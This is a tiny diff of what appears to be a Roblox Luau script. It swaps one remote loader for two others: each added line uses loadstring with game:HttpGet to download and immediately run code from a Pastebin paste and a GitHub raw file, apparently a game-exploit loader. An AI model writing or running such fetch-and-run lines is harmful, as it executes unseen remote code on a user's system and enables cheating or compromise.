@@ -1,2 +1,3 @@
-ID="9ac99389-64f5-4793-b12b-287bd5b1a665";
-loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/MuvvBeS4"))()
+task.wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bacondarkspavner/Darkspawners/refs/heads/main/Loading"))()
